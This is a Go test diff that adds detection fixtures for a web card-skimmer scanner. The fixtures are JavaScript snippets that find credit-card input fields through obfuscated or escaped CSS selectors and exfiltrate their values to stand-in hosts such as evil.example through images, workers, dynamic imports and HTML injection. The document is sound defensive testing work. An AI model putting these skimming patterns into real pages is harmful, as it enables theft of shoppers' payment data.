@@ -1,7 +1,9 @@
 package web
 
 import (
+	"bytes"
 	"context"
+	"encoding/base64"
 	"fmt"
 	"math/rand/v2"
 	"os"
@@ -342,6 +344,42 @@ func TestSkimmerSignalsOnTokens(t *testing.T) {
 	} {
 		if skimmerSignals([]byte(src)) == nil {
 			t.Errorf("%s: not found", name)
+		}
+	}
+}
+
+// A name is read the way a CSS selector matches it, the ways out include markup written into the
+// page and attributes set on it, and only a literal that is really data hides what it holds.
+func TestSkimmerSelectorsExitsAndData(t *testing.T) {
+	const send = `;new Image().src="https://img.example.com/p?d="+f.value`
+	for name, src := range map[string]string{
+		"split name":            `var f=document.querySelector('[name^=card][name$=number]')` + send,
+		"quoted split name":     `var f=document.querySelector('input[name^="card"][name$="number" i]')` + send,
+		"CSS escape":            `var f=document.querySelector('[name=\\63 vv]')` + send,
+		"CSS escape no blank":   `var f=document.querySelector('[name*=\\000063vv]')` + send,
+		"split name with a gap": `var f=document.querySelector('[name^="payment[c"][name$="_number]"]')` + send,
+		"escaped id":            `var f=document.querySelector('#card\\4e umber')` + send,
+		"worker":                `var f=document.querySelector('[name="cc_number"]');new Worker('https://evil.example/w.js').postMessage(f.value)`,
+		"long sum":              `var f=document.forms[0].cardnumber;var v=(0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+cardnumber.value)` + send,
+		"document.write":        `var f=document.querySelector('[name="cc_number"]');document.write('<img src="https://evil.example/p?d='+f.value+'">')`,
+		"innerHTML":             `var f=document.querySelector('[name="cc_number"]');d.innerHTML='<img src=https://evil.example/p?d='+f.value+'>'`,
+		"insertAdjacentHTML":    `var f=document.querySelector('[name="cc_number"]');d.insertAdjacentHTML('beforeend','<form action="https://evil.example/p?d='+f.value+'">')`,
+		"setAttribute":          `var f=document.querySelector('[name="cc_number"]');i.setAttribute('src','https://evil.example/p?d='+f.value)`,
+		"Audio":                 `var f=document.querySelector('[name="cc_number"]');new Audio('https://evil.example/p?d='+f.value)`,
+		"Object.assign":         `var f=document.querySelector('[name="cc_number"]');Object.assign(new Image(),{src:'https://evil.example/p?d='+f.value})`,
+		"import":                `var f=document.querySelector('[name="cc_number"]');import('https://evil.example/p.js?d='+f.value)`,
+	} {
+		if skimmerSignals([]byte(src)) == nil {
+			t.Errorf("%s: not found", name)
+		}
+	}
+	png := base64.StdEncoding.EncodeToString(append([]byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00"), bytes.Repeat([]byte{0, 1, 2, 0xff}, 40)...))
+	for name, src := range map[string]string{
+		"data URI": `var i='data:image/png;base64,` + png[:40] + `cardnumberAA` + png[40:] + `';new Image().src="https://img.example.com/p?d="+i`,
+		"literal":  `var i="` + png[:40] + `cardnumberAA` + png[40:] + `";logo.src=i;new Image().src="https://img.example.com/p?d="+location.hash`,
+	} {
+		if s := skimmerSignals([]byte(src)); s != nil {
+			t.Errorf("%s: %v", name, s)
 		}
 	}
 }
